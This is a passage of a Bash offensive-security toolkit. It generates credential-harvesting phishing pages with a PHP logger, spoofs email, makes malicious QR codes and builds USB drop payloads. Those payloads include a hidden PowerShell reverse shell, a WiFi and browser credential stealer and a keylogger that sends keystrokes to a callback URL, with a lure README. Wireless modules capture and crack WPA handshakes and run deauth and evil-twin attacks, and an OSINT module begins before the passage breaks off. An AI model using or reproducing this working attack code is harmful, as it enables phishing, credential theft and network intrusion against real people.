    echo -e "${CYAN}Access the cloned site at: http://$(hostname -I | awk '{print $1}'):$harvest_port${NC}"
    echo -e "${RED}[!] Press Ctrl+C to stop the server${NC}"
    echo ""
    
    cd "$clone_dir" && php -S "0.0.0.0:$harvest_port" 2>&1 | while read line; do
        echo "$line"
        # Check for captured credentials
        if [[ -f "$clone_dir/captured_creds.txt" ]]; then
            local new_creds=$(tail -1 "$clone_dir/captured_creds.txt")
            echo -e "${RED}[!] CAPTURED: $new_creds${NC}"
            cp "$clone_dir/captured_creds.txt" "$CREDS_DIR/creds_$timestamp.txt"
        fi
    done
}

# Custom phishing page generator
custom_phish_page() {
    show_menu "Custom Phishing Page Generator" "Create a custom phishing login page"
    
    timestamp=$(date +%Y%m%d_%H%M%S)
    local template_dir="$PHISHING_DIR/templates/custom_$timestamp"
    create_dir "$template_dir"
    
    show_menu "Template Type" "1) Corporate Login
2) Social Media Login
3) Banking Login
4) Email Login
5) Custom HTML
0) Back to main menu"
    
    local template_choice=$(read_input "Choice: ")
    [[ "$template_choice" == "0" ]] && return
    [[ "$template_choice" == "99" ]] && return
    
    case $template_choice in
        1) template_name="Corporate Portal" ;;
        2) template_name="Social Media" ;;
        3) template_name="Banking" ;;
        4) template_name="Email Login" ;;
        5) template_name="Custom" ;;
    esac
    
    local page_title=$(read_input "Enter page title: ")
    [[ "$page_title" == "99" ]] && return
    
    local company_name=$(read_input "Enter company/logo name: ")
    [[ "$company_name" == "99" ]] && return
    
    local redirect_url=$(read_input "Enter redirect URL (after capture): ")
    [[ "$redirect_url" == "99" ]] && return
    
    # Generate HTML
    cat > "$template_dir/index.html" << EOF
<!DOCTYPE html>
<html>
<head>
    <title>$page_title</title>
    <style>
        body { font-family: Arial, sans-serif; background: #f0f0f0; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-box { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); width: 300px; }
        .logo { text-align: center; font-size: 24px; font-weight: bold; margin-bottom: 20px; color: #333; }
        input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; }
        button { width: 100%; padding: 12px; background: #0078d4; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; }
        button:hover { background: #106ebe; }
    </style>
</head>
<body>
    <div class="login-box">
        <div class="logo">$company_name</div>
        <form action="capture.php" method="POST">
            <input type="text" name="username" placeholder="Username/Email" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Sign In</button>
        </form>
    </div>
</body>
</html>
EOF

    # Create capture script
    cat > "$template_dir/capture.php" << EOF
<?php
\$timestamp = date('Y-m-d H:i:s');
\$data = "[\$timestamp] ";
foreach(\$_POST as \$key => \$value) {
    \$data .= "\$key=\$value; ";
}
\$data .= "IP=".\$_SERVER['REMOTE_ADDR']."\\n";
file_put_contents('captured_creds.txt', \$data, FILE_APPEND);
header('Location: $redirect_url');
?>
EOF

    local serve_port=$(read_input "Enter port to serve on (default 8080): ")
    [[ "$serve_port" == "99" ]] && return
    serve_port=${serve_port:-8080}
    
    echo -e "${GREEN}[+] Phishing page created in: $template_dir${NC}"
    echo -e "${YELLOW}[*] Starting server...${NC}"
    echo -e "${CYAN}Access at: http://$(hostname -I | awk '{print $1}'):$serve_port${NC}"
    
    cd "$template_dir" && php -S "0.0.0.0:$serve_port"
}

# Email spoofing tool
email_spoofer() {
    check_install sendemail
    
    show_menu "Email Spoofing/Sending Tool" "WARNING: Only use for authorized testing!"
    
    echo -e "${RED}[!] WARNING: Only use for authorized testing!${NC}"
    echo ""
    
    local smtp_server=$(read_input "SMTP server (IP:port): ")
    [[ -z "$smtp_server" ]] && return
    [[ "$smtp_server" == "99" ]] && return
    
    local from_addr=$(read_input "From address (can be spoofed): ")
    [[ "$from_addr" == "99" ]] && return
    
    local to_addr=$(read_input "To address: ")
    [[ "$to_addr" == "99" ]] && return
    
    local subject=$(read_input "Subject: ")
    [[ "$subject" == "99" ]] && return
    
    local body=$(read_input "Message body (or path to HTML file): ")
    [[ "$body" == "99" ]] && return
    
    # Check if body is a file
    if [[ -f "$body" ]]; then
        body_arg="-o message-file=\"$body\""
    else
        body_arg="-u \"$body\""
    fi
    
    local attachment=$(read_input "Attachment file (optional, press Enter to skip): ")
    [[ "$attachment" == "99" ]] && return
    [[ -n "$attachment" ]] && attach_arg="-a \"$attachment\"" || attach_arg=""
    
    local use_tls=$(read_input "Use TLS/SSL? (y/n): ")
    [[ "$use_tls" == "y" ]] && tls_arg="-tls=yes" || tls_arg=""
    
    echo -e "${YELLOW}[*] Sending email...${NC}"
    sendemail -f "$from_addr" -t "$to_addr" -u "$subject" $body_arg -s "$smtp_server" $tls_arg $attach_arg -v
    
    echo -n "Press Enter to continue..."
    read
}

# View captured credentials
view_captured_creds() {
    show_menu "Captured Credentials Database" "View harvested credentials from phishing campaigns"
    
    # List all captured credential files
    local cred_files=()
    for f in "$CREDS_DIR"/*.txt "$PHISHING_DIR"/captured_*.txt "$PHISHING_DIR"/*/captured_creds.txt; do
        [[ -f "$f" ]] && cred_files+=("$f")
    done 2>/dev/null    
    
    if [[ ${#cred_files[@]} -eq 0 ]]; then
        echo -e "${YELLOW}[!] No captured credentials found${NC}"
    else
        echo -e "${GREEN}[+] Found credential files:${NC}"
        local i=1
        for file in "${cred_files[@]}"; do
            [[ -f "$file" ]] && echo "  $i) $file ($(wc -l < "$file") entries)"
            ((i++))
        done
        
        echo ""
        local view_choice=$(read_input "View file number (or 'all'): ")
        
        if [[ "$view_choice" == "all" ]]; then
            for file in "${cred_files[@]}"; do
                [[ -f "$file" ]] && echo -e "\n=== $file ===" && cat "$file"
            done
        else
            local selected="${cred_files[$((view_choice-1))]}"
            [[ -f "$selected" ]] && cat "$selected"
        fi
    fi
    
    echo ""
    local export_creds=$(read_input "Export to single file? (y/n): ")
    if [[ "$export_creds" == "y" ]]; then
        local export_file="$CREDS_DIR/all_creds_$(date +%Y%m%d).txt"
        cat "${cred_files[@]}" 2>/dev/null > "$export_file"
        echo -e "${GREEN}[+] Exported to: $export_file${NC}"
    fi
    
    echo -n "Press Enter to continue..."
    read
}

# QR Code phishing generator
qr_code_phish() {
    show_menu "QR Code Phishing Generator" "Create malicious QR codes for phishing"
    
    local malicious_url=$(read_input "Enter malicious URL: ")
    [[ -z "$malicious_url" ]] && return
    [[ "$malicious_url" == "99" ]] && return
    
    local qr_filename=$(read_input "Output filename (without extension): ")
    [[ -z "$qr_filename" ]] && return
    [[ "$qr_filename" == "99" ]] && return
    
    timestamp=$(date +%Y%m%d_%H%M%S)
    
    # Check for qrencode or use Python
    if command -v qrencode &>/dev/null; then
        qrencode -o "$PHISHING_DIR/${qr_filename}.png" "$malicious_url"
        echo -e "${GREEN}[+] QR Code saved to: $PHISHING_DIR/${qr_filename}.png${NC}"
    else
        python3 -c "
import qrcode
qr = qrcode.QRCode(version=1, box_size=10, border=5)
qr.add_data('$malicious_url')
qr.make(fit=True)
img = qr.make_image(fill_color='black', back_color='white')
img.save('$PHISHING_DIR/${qr_filename}.png')
" 2>/dev/null && echo -e "${GREEN}[+] QR Code saved to: $PHISHING_DIR/${qr_filename}.png${NC}" || \
        echo -e "${RED}[!] Install qrencode or python3-qrcode${NC}"
    fi
    
    echo -e "${YELLOW}[*] QR Code points to: $malicious_url${NC}"
    echo -n "Press Enter to continue..."
    read
}

# USB drop attack generator
usb_drop_generator() {
    show_menu "USB Drop Attack Generator" "Creates autorun payloads for USB devices"
    
    echo -e "${YELLOW}[*] Creates autorun payloads for USB devices${NC}"
    echo ""
    
    timestamp=$(date +%Y%m%d_%H%M%S)
    local usb_dir="$PHISHING_DIR/usb_payloads_$timestamp"
    create_dir "$usb_dir"
    
    show_menu "Payload Type" "1) Reverse shell (PowerShell)
2) Credential harvester
3) Keylogger dropper
4) Custom batch script
0) Back to main menu"
    
    local usb_choice=$(read_input "Choice: ")
    [[ "$usb_choice" == "0" ]] && return
    [[ "$usb_choice" == "99" ]] && return
    
    case $usb_choice in
        1)
            local lhost=$(read_input "Enter LHOST: ")
            [[ -z "$lhost" ]] && return
            [[ "$lhost" == "99" ]] && return
            
            local lport=$(read_input "Enter LPORT: ")
            [[ "$lport" == "99" ]] && return
            
            cat > "$usb_dir/autorun.bat" << EOF
@echo off
powershell -WindowStyle Hidden -Command "\$client = New-Object System.Net.Sockets.TCPClient('$lhost',$lport);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()"
EOF
            ;;
        2)
            cat > "$usb_dir/autorun.bat" << 'EOF'
@echo off
powershell -Command "netsh wlan show profile * key=clear | Out-File %TEMP%\wifi_creds.txt; (Get-Content $env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Login Data -ErrorAction SilentlyContinue | Out-File %TEMP%\chrome_creds.txt -Append); copy %TEMP%\wifi_creds.txt %CD%\captured\ 2>nul"
EOF
            create_dir "$usb_dir/captured"
            ;;
        3)
            local callback_url=$(read_input "Enter callback URL for logs: ")
            [[ -z "$callback_url" ]] && return
            [[ "$callback_url" == "99" ]] && return
            
            cat > "$usb_dir/autorun.bat" << EOF
@echo off
powershell -WindowStyle Hidden -Command "Add-Type -AssemblyName System.Windows.Forms; \$keys = ''; while(\$true){ Start-Sleep -m 10; for(\$i=1; \$i -le 254; \$i++){\$key = [System.Windows.Forms.SendKeys]::GetAsyncKeyState(\$i); if(\$key -eq -32767){\$keys += [char]\$i; if(\$keys.Length -gt 100){ Invoke-WebRequest -Uri '$callback_url' -Method POST -Body \$keys; \$keys = ''}}}}"
EOF
            ;;
        4)
            local custom_batch=$(read_input "Enter path to custom batch file: ")
            [[ -f "$custom_batch" ]] && cp "$custom_batch" "$usb_dir/autorun.bat"
            ;;
    esac
    
    # Create autorun.inf for older Windows systems
    cat > "$usb_dir/autorun.inf" << EOF
[AutoRun]
Open=autorun.bat
Action=Open folder to view files
Label=USB Drive
Icon=%SystemRoot%\system32\SHELL32.dll,4
EOF

    # Create README for social engineering
    cat > "$usb_dir/README.txt" << EOF
IMPORTANT - Corporate Security Update

Please run the security update from this drive to ensure your system is protected.

Contact IT Support for assistance.
EOF

    echo -e "${GREEN}[+] USB payload created in: $usb_dir${NC}"
    echo -e "${YELLOW}[!] Copy contents to USB root. Disable antivirus on target.${NC}"
    echo -n "Press Enter to continue..."
    read
}

# =============================================================================
# WIRELESS ATTACKS MODULE
# =============================================================================

# WiFi network scanner and attack suite
wifi_attacks() {
    check_install aircrack-ng
    check_install macchanger
    check_install wireless-tools
    
    while true; do
        show_menu "Wireless Attacks Module" "1) Scan for wireless networks
2) Capture WPA/WPA2 handshake
3) Crack WPA/WPA2 handshake
4) WPS PIN attack (Reaver)
5) Deauth attack
6) Create fake access point (Evil Twin)
7) Monitor mode management
8) WiFi Brute Forcer (WPA/WPA2)
0) Back to Main Menu"
        
        local wifi_choice=$(read_input "Select option: ")
        
        case $wifi_choice in
            1) wifi_scan ;;
            2) capture_handshake ;;
            3) crack_handshake ;;
            4) wps_attack ;;
            5) deauth_attack ;;
            6) evil_twin ;;
            7) monitor_mode_menu ;;
            8) wifi_brute_forcer ;;
            0) break ;;
            *) echo -e "${RED}Invalid option${NC}"; sleep 1 ;;
        esac
    done
}

# Scan for wireless networks
wifi_scan() {
    show_menu "Wireless Network Scanner" "Scan for nearby WiFi networks"
    
    # Check for wireless interfaces
    local iface=$(iw dev 2>/dev/null | grep Interface | awk '{print $2}' | head -1)
    
    if [[ -z "$iface" ]]; then
        echo -e "${RED}[!] No wireless interface found${NC}"
        local iface=$(read_input "Enter interface manually (e.g., wlan0): ")
    else
        echo -e "${GREEN}[+] Found wireless interface: $iface${NC}"
    fi
    
    [[ -z "$iface" ]] && return
    [[ "$iface" == "99" ]] && return
    
    local enable_monitor=$(read_input "Put interface in monitor mode? (y/n): ")
    
    if [[ "$enable_monitor" == "y" ]]; then
        airmon-ng check kill 2>/dev/null
        airmon-ng start "$iface" 2>/dev/null
        iface="${iface}mon"
        echo -e "${GREEN}[+] Monitor mode enabled on $iface${NC}"
    fi
    
    echo -e "${YELLOW}[*] Scanning for networks... Press Ctrl+C when ready${NC}"
    echo ""
    
    timestamp=$(date +%Y%m%d_%H%M%S)
    local scan_file="$RESULTS_DIR/wifi/scan_$timestamp.csv"
    
    airodump-ng "$iface" --write "$scan_file" --output-format csv 2>/dev/null &
    local scan_pid=$!
    
    echo -n "Press Enter to stop scan..."
    read
    
    kill $scan_pid 2>/dev/null
    echo -e "${GREEN}[+] Scan saved to: $scan_file${NC}"
    
    # Display results
    if [[ -f "$scan_file-01.csv" ]]; then
        echo -e "${CYAN}=== Networks Found ===${NC}"
        tail -n +2 "$scan_file-01.csv" | head -20
    fi
    
    echo -n "Press Enter to continue..."
    read
}

# Capture WPA/WPA2 handshake
capture_handshake() {
    show_menu "WPA/WPA2 Handshake Capture" "Capture wireless handshakes for cracking"
    
    local iface=$(iw dev 2>/dev/null | grep Interface | awk '{print $2}' | head -1)
    [[ -z "$iface" ]] && local iface=$(read_input "Enter interface: ")
    [[ -z "$iface" ]] && return
    [[ "$iface" == "99" ]] && return
    
    local target_bssid=$(read_input "Enter target BSSID: ")
    [[ -z "$target_bssid" ]] && return
    [[ "$target_bssid" == "99" ]] && return
    
    local target_channel=$(read_input "Enter target channel: ")
    [[ "$target_channel" == "99" ]] && return
    
    local output_name=$(read_input "Enter output filename (default: handshake): ")
    [[ "$output_name" == "99" ]] && return
    output_name=${output_name:-handshake}
    
    timestamp=$(date +%Y%m%d_%H%M%S)
    local cap_dir="$RESULTS_DIR/wifi/handshakes"
    create_dir "$cap_dir"
    
    echo -e "${YELLOW}[*] Starting capture on channel $target_channel...${NC}"
    echo -e "${YELLOW}[*] Waiting for handshake. Send deauth to force reconnect.${NC}"
    
    airodump-ng --bssid "$target_bssid" -c "$target_channel" -w "$cap_dir/${output_name}_$timestamp" "$iface" 2>/dev/null &
    local capture_pid=$!
    
    echo ""
    local send_deauth=$(read_input "Send deauth packets to force handshake? (y/n): ")
    
    if [[ "$send_deauth" == "y" ]]; then
        local deauth_count=$(read_input "Number of deauth packets (default: 10): ")
        [[ "$deauth_count" == "99" ]] && return
        deauth_count=${deauth_count:-10}
        
        aireplay-ng -0 "$deauth_count" -a "$target_bssid" "$iface" 2>/dev/null
    fi
    
    echo -n "Press Enter to stop capture..."
    read
    kill $capture_pid 2>/dev/null
    
    # Check for handshake
    if [[ -f "$cap_dir/${output_name}_$timestamp-01.cap" ]]; then
        echo -e "${GREEN}[+] Capture file saved${NC}"
        aircrack-ng "$cap_dir/${output_name}_$timestamp-01.cap" 2>/dev/null | grep -E "WPA|handshake"
    fi
    
    echo -n "Press Enter to continue..."
    read
}

# Crack captured handshake
crack_handshake() {
    show_menu "WPA/WPA2 Handshake Cracker" "Crack captured wireless handshakes"
    
    local cap_file=$(read_input "Enter path to .cap file: ")
    [[ -z "$cap_file" ]] && return
    [[ "$cap_file" == "99" ]] && return
    
    if [[ ! -f "$cap_file" ]]; then
        echo -e "${RED}[!] File not found${NC}"
        return
    fi
    
    show_menu "Wordlist Selection" "1) rockyou.txt
2) SecLists common passwords
3) Custom wordlist
0) Back to main menu"
    
    local wordlist_choice=$(read_input "Choice: ")
    [[ "$wordlist_choice" == "0" ]] && return
    [[ "$wordlist_choice" == "99" ]] && return
    
    case $wordlist_choice in
        1) wordlist="$WORDLISTS_DIR/rockyou.txt" ;;
        2) wordlist="$WORDLISTS_DIR/seclists/Passwords/Common-Credentials/10-million-password-list-top-100000.txt" ;;
        3) 
            local wordlist=$(read_input "Enter wordlist path: ")
            [[ "$wordlist" == "99" ]] && return
            ;;
    esac
    
    if [[ ! -f "$wordlist" ]]; then
        echo -e "${RED}[!] Wordlist not found${NC}"
        return
    fi
    
    echo -e "${YELLOW}[*] Starting crack with aircrack-ng...${NC}"
    aircrack-ng "$cap_file" -w "$wordlist"
    
    echo -n "Press Enter to continue..."
    read
}

# WiFi Brute Forcer - Automated WPA/WPA2 cracking
wifi_brute_forcer() {
    show_menu "WiFi Brute Forcer" "Automated WPA/WPA2 password cracking"
    
    local iface=$(iw dev 2>/dev/null | grep Interface | awk '{print $2}' | head -1)
    [[ -z "$iface" ]] && local iface=$(read_input "Enter wireless interface: ")
    [[ -z "$iface" ]] && return
    [[ "$iface" == "99" ]] && return
    
    local enable_mon=$(read_input "Enable monitor mode? (y/n): ")
    if [[ "$enable_mon" == "y" ]]; then
        airmon-ng check kill 2>/dev/null
        airmon-ng start "$iface" 2>/dev/null
        iface="${iface}mon"
    fi
    
    echo -e "${YELLOW}[*] Scanning for targets... (10 seconds)${NC}"
    local scan_file="$RESULTS_DIR/wifi/brute_scan_$(date +%Y%m%d_%H%M%S)"
    timeout 10 airodump-ng "$iface" --write "$scan_file" --output-format csv 2>/dev/null || true
    
    echo ""
    echo -e "${CYAN}=== Available Targets ===${NC}"
    local targets=()
    local i=1
    while IFS=',' read -r mac _ _ channel _ _ _ _ _ _ ssid _; do
        [[ -n "$mac" && "$mac" != "BSSID" ]] && [[ "$mac" =~ ^[0-9a-fA-F:]{17}$ ]] && \
            targets+=("$mac|$channel|$ssid") && \
            echo "  $i) $ssid ($mac) - Ch: $channel" && \
            ((i++))
    done < <(tail -n +2 "$scan_file-01.csv" 2>/dev/null | head -20)
    
    [[ ${#targets[@]} -eq 0 ]] && echo -e "${RED}[!] No targets found${NC}" && return
    
    echo ""
    echo "0) Back to main menu"
    local target_choice=$(read_input "Select target: ")
    [[ "$target_choice" == "0" ]] && return
    [[ "$target_choice" == "99" ]] && return
    [[ $target_choice -gt ${#targets[@]} ]] && echo -e "${RED}Invalid selection${NC}" && return
    
    local selected="${targets[$((target_choice-1))]}"
    local target_bssid=$(echo "$selected" | cut -d'|' -f1)
    local target_channel=$(echo "$selected" | cut -d'|' -f2)
    local target_ssid=$(echo "$selected" | cut -d'|' -f3)
    
    echo ""
    show_menu "Wordlist Selection" "1) rockyou.txt ($(wc -l < "$WORDLISTS_DIR/rockyou.txt" 2>/dev/null || echo "unknown") words)
2) SecLists top 100k
3) Custom wordlist
0) Back to main menu"
    
    local wordlist_choice=$(read_input "Choice: ")
    [[ "$wordlist_choice" == "0" ]] && return
    [[ "$wordlist_choice" == "99" ]] && return
    
    case $wordlist_choice in
        1) wordlist="$WORDLISTS_DIR/rockyou.txt" ;;
        2) wordlist="$WORDLISTS_DIR/seclists/Passwords/Common-Credentials/10-million-password-list-top-100000.txt" ;;
        3) 
            local wordlist=$(read_input "Enter wordlist path: ")
            [[ "$wordlist" == "99" ]] && return
            ;;
    esac
    
    [[ ! -f "$wordlist" ]] && echo -e "${RED}[!] Wordlist not found${NC}" && return
    
    echo ""
    echo -e "${YELLOW}[*] Configuration:${NC}"
    echo "  Target: $target_ssid ($target_bssid)"
    echo "  Channel: $target_channel"
    echo "  Wordlist: $wordlist ($(wc -l < "$wordlist") words)"
    echo ""
    local confirm=$(read_input "Start brute force attack? (y/n): ")
    
    [[ "$confirm" != "y" ]] && return
    
    timestamp=$(date +%Y%m%d_%H%M%S)
    local cap_file="$RESULTS_DIR/wifi/brute_${target_ssid}_$timestamp"
    
    echo -e "${YELLOW}[*] Capturing handshake...${NC}"
    airodump-ng --bssid "$target_bssid" -c "$target_channel" -w "$cap_file" "$iface" &
    local dump_pid=$!
    
    sleep 5
    echo -e "${YELLOW}[*] Sending deauth to force handshake...${NC}"
    aireplay-ng -0 10 -a "$target_bssid" "$iface" 2>/dev/null
    
    sleep 5
    kill $dump_pid 2>/dev/null
    
    local cap_file_path="${cap_file}-01.cap"
    if [[ -f "$cap_file_path" ]]; then
        echo -e "${GREEN}[+] Handshake captured${NC}"
        echo -e "${YELLOW}[*] Starting brute force...${NC}"
        aircrack-ng "$cap_file_path" -w "$wordlist"
    else
        echo -e "${RED}[!] Failed to capture handshake${NC}"
    fi
    
    echo -n "Press Enter to continue..."
    read
}

# WPS PIN attack
wps_attack() {
    check_install reaver
    
    show_menu "WPS PIN Attack (Reaver)" "Attack WiFi Protected Setup PIN"
    
    local iface=$(iw dev 2>/dev/null | grep Interface | awk '{print $2}' | head -1)
    [[ -z "$iface" ]] && local iface=$(read_input "Enter interface: ")
    [[ -z "$iface" ]] && return
    [[ "$iface" == "99" ]] && return
    
    local target_bssid=$(read_input "Enter target BSSID: ")
    [[ -z "$target_bssid" ]] && return
    [[ "$target_bssid" == "99" ]] && return
    
    echo -e "${YELLOW}[*] Starting WPS PIN attack...${NC}"
    echo -e "${YELLOW}[*] This may take several hours${NC}"
    
    reaver -i "$iface" -b "$target_bssid" -vv
    
    echo -n "Press Enter to continue..."
    read
}

# Deauthentication attack
deauth_attack() {
    show_menu "Deauthentication Attack" "Disconnect clients from WiFi networks"
    
    local iface=$(iw dev 2>/dev/null | grep Interface | awk '{print $2}' | head -1)
    [[ -z "$iface" ]] && local iface=$(read_input "Enter interface: ")
    [[ -z "$iface" ]] && return
    [[ "$iface" == "99" ]] && return
    
    local target_bssid=$(read_input "Enter target BSSID (AP): ")
    [[ -z "$target_bssid" ]] && return
    [[ "$target_bssid" == "99" ]] && return
    
    local client_mac=$(read_input "Enter target client MAC (or FF:FF:FF:FF:FF:FF for broadcast): ")
    [[ "$client_mac" == "99" ]] && return
    client_mac=${client_mac:-FF:FF:FF:FF:FF:FF}
    
    local packet_count=$(read_input "Number of packets (0=infinite): ")
    [[ "$packet_count" == "99" ]] && return
    
    echo -e "${RED}[!] WARNING: Only use on networks you own!${NC}"
    local confirm=$(read_input "Continue? (y/n): ")
    
    if [[ "$confirm" == "y" ]]; then
        echo -e "${YELLOW}[*] Sending deauth packets...${NC}"
        aireplay-ng -0 "$packet_count" -a "$target_bssid" -c "$client_mac" "$iface"
    fi
    
    echo -n "Press Enter to continue..."
    read
}

# Evil Twin fake AP
evil_twin() {
    check_install hostapd
    check_install dnsmasq
    
    show_menu "Evil Twin Access Point" "Create a rogue access point"
    
    local ap_iface=$(read_input "Enter interface for AP (e.g., wlan0): ")
    [[ -z "$ap_iface" ]] && return
    [[ "$ap_iface" == "99" ]] && return
    
    local ssid_name=$(read_input "Enter SSID name: ")
    [[ "$ssid_name" == "99" ]] && return
    
    local channel=$(read_input "Enter channel (1-14): ")
    [[ "$channel" == "99" ]] && return
    
    timestamp=$(date +%Y%m%d_%H%M%S)
    local evil_dir="$RESULTS_DIR/wifi/eviltwin_$timestamp"
    create_dir "$evil_dir"
    
    # Create hostapd config
    cat > "$evil_dir/hostapd.conf" << EOF
interface=$ap_iface
driver=nl80211
ssid=$ssid_name
hw_mode=g
channel=$channel
wmm_enabled=0
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
EOF

    # Create dnsmasq config
    cat > "$evil_dir/dnsmasq.conf" << EOF
interface=$ap_iface
dhcp-range=10.0.0.10,10.0.0.250,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1
EOF

    echo -e "${YELLOW}[*] Setting up interface...${NC}"
    ifconfig "$ap_iface" up 10.0.0.1 netmask 255.255.255.0
    
    echo -e "${YELLOW}[*] Starting dnsmasq...${NC}"
    dnsmasq -C "$evil_dir/dnsmasq.conf" -d &
    local dns_pid=$!
    
    echo -e "${YELLOW}[*] Starting hostapd...${NC}"
    hostapd "$evil_dir/hostapd.conf" &
    local hostapd_pid=$!
    
    echo -e "${GREEN}[+] Evil Twin AP '$ssid_name' running on channel $channel${NC}"
    echo -e "${CYAN}Interface: $ap_iface | Gateway: 10.0.0.1${NC}"
    echo ""
    echo -n "Press Enter to stop AP..."
    read
    
    kill $hostapd_pid 2>/dev/null
    kill $dns_pid 2>/dev/null
    killall dnsmasq hostapd 2>/dev/null
    
    echo -e "${GREEN}[+] Evil Twin stopped${NC}"
    echo -n "Press Enter to continue..."
    read
}

# Monitor mode management
monitor_mode_menu() {
    show_menu "Monitor Mode Management" "Manage wireless interface monitor mode"
    
    local iface=$(iw dev 2>/dev/null | grep Interface | awk '{print $2}' | head -1)
    
    echo "Current interfaces:"
    iw dev 2>/dev/null | grep Interface | awk '{print "  - " $2}'
    echo ""
    
    show_menu "Monitor Mode Options" "1) Enable monitor mode
2) Disable monitor mode
3) Change MAC address
0) Back to main menu"
    
    local mon_choice=$(read_input "Choice: ")
    
    case $mon_choice in
        1)
            local iface=$(read_input "Enter interface: ")
            [[ -z "$iface" ]] && return
            [[ "$iface" == "99" ]] && return
            echo -e "${YELLOW}[*] Enabling monitor mode on $iface...${NC}"
            airmon-ng check kill 2>/dev/null
            airmon-ng start "$iface"
            ;;
        2)
            local iface=$(read_input "Enter interface (e.g., wlan0mon): ")
            [[ -z "$iface" ]] && return
            [[ "$iface" == "99" ]] && return
            echo -e "${YELLOW}[*] Disabling monitor mode...${NC}"
            airmon-ng stop "$iface"
            service NetworkManager restart 2>/dev/null || service networking restart 2>/dev/null
            ;;
        3)
            local iface=$(read_input "Enter interface: ")
            [[ -z "$iface" ]] && return
            [[ "$iface" == "99" ]] && return
            local new_mac=$(read_input "Enter new MAC (or 'random'): ")
            [[ "$new_mac" == "99" ]] && return
            
            if [[ "$new_mac" == "random" ]]; then
                macchanger -r "$iface"
            else
                macchanger -m "$new_mac" "$iface"
            fi
            ;;
    esac
    
    echo -n "Press Enter to continue..."
    read
}

# =============================================================================
# OSINT MODULE
# =============================================================================

osint_menu() {
    while true; do
        show_menu "OSINT & Reconnaissance" "1) Domain Information Gathering
2) Email OSINT (theHarvester)
3) Metadata Extraction
4) Shodan Search
5) DNS Enumeration
6) WHOIS Lookup
7) Full OSINT Report (All Tools)
0) Back to Main Menu"
        
        local osint_choice=$(read_input "Select option: ")
        
        case $osint_choice in
            1) domain_osint ;;
            2) email_osint ;;
            3) metadata_extraction ;;
            4) shodan_search ;;
            5) dns_enum_osint ;;
            6) whois_lookup ;;
            7) full_osint_report ;;
            0) break ;;
            *) echo -e "${RED}Invalid option${NC}"; sleep 1 ;;
        esac
    done
}

domain_osint() {
    show_menu "Domain Information Gathering" "Gather comprehensive domain intelligence"
    
    local domain=$(read_input "Enter domain: ")
    [[ -z "$domain" ]] && return
    [[ "$domain" == "99" ]] && return
    
    timestamp=$(date +%Y%m%d_%H%M%S)
    local output_dir="$OSINT_DIR/domain_$domain_$timestamp"
    create_dir "$output_dir"
    
    echo -e "${YELLOW}[*] Gathering domain information...${NC}"
    
    # DNS records
    echo "=== DNS Records ===" > "$output_dir/dns_records.txt"
    for record in A AAAA MX NS TXT SOA; do
        echo "--- $record Records ---" >> "$output_dir/dns_records.txt"
        host -t "$record" "$domain" >> "$output_dir/dns_records.txt" 2>&1 || true
    done
    
    # Subdomain enumeration
    echo -e "${YELLOW}[*] Enumerating subdomains...${NC}"
    echo "=== Subdomains ===" > "$output_dir/subdomains.txt"
    for sub in www mail ftp admin portal api dev test staging shop blog; do
        host "$sub.$domain" >> "$output_dir/subdomains.txt" 2>&1 &
    done
    wait
    
    # Certificate transparency
    curl -s "https://crt.sh/?q=%.$domain&output=json" 2>/dev/null | \
        jq -r '.[].name_value' 2>/dev/null | sort -u >> "$output_dir/subdomains.txt" || true
    
    # IP lookup
    local ip=$(host "$domain" | grep "has address" | head -1 | awk '{print $4}')
    echo "=== IP Information ===" > "$output_dir/ip_info.txt"
    echo "Domain: $domain" >> "$output_dir/ip_info.txt"
    echo "IP: $ip" >> "$output_dir/ip_info.txt"
    [[ -n "$ip" ]] && whois "$ip" >> "$output_dir/ip_info.txt" 2>&1 || true
    
    echo -e "${GREEN}[+] Domain OSINT complete. Results saved to: $output_dir${NC}"
    echo -n "Press Enter to continue..."
    read
}

email_osint() {
    check_install theharvester
    
    show_menu "Email OSINT (theHarvester)" "Harvest email addresses from various sources"
    
    local domain=$(read_input "Enter domain to search: ")
    [[ -z "$domain" ]] && return
    [[ "$domain" == "99" ]] && return
    
    timestamp=$(date +%Y%m%d_%H%M%S)
    local output_file="$OSINT_DIR/emails_${domain}_$timestamp.txt"
    
    echo -e "${YELLOW}[*] Searching for emails...${NC}"
    theharvester -d "$domain" -b all -f "$output_file" 2>&1 | tail -50
    
    echo -e "${GREEN}[+] Results saved to: $output_file${NC}"
    echo -n "Press Enter to continue..."
    read
}

metadata_extraction() {
    check_install exiftool
    
    show_menu "Metadata Extraction" "Extract hidden metadata from files"
    
    local filepath=$(read_input "Enter file or directory path: ")
    [[ -z "$filepath" ]] && return
    [[ "$filepath" == "99" ]] && return
    
    timestamp=$(date +%Y%m%d_%H%M%S)
    local output_file="$OSINT_DIR/metadata_$timestamp.txt"
    
    if [[ -f "$filepath" ]]; then
        exiftool "$filepath" | tee "$output_file"
    elif [[ -d "$filepath" ]]; then
        find "$filepath" -type f -exec exiftool {} \; | tee "$output_file"
    else
        echo -e "${RED}[!] Path not found${NC}"
        return
    fi
    
    echo -e "${GREEN}[+] Metadata saved to: $output_file${NC}"
    echo -n "Press Enter to continue..."
    read
}

shodan_search() {
    show_menu "Shodan Search" "Search for internet-connected devices"
    
    if ! python3 -c "import shodan" 2>/dev/null; then
        echo -e "${YELLOW}[!] Shodan module not installed. Installing...${NC}"
        pip3 install shodan 2>/dev/null || pip3 install --break-system-packages shodan 2>/dev/null
    fi
    
    local shodan_key=$(read_input "Enter Shodan API key: " && echo "")
